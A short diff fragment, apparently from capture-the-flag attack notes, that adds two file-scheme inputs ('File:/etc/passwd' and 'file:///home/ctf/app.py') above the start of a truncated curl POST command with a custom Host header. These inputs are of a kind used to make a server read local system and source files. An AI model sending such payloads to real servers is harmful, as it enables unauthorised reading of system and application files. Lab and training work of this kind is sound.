@@ -1,3 +1,5 @@
+File:/etc/passwd
+file:///home/ctf/app.py
 Linux:
 curl -X POST \
   -H "Host: company-home" \
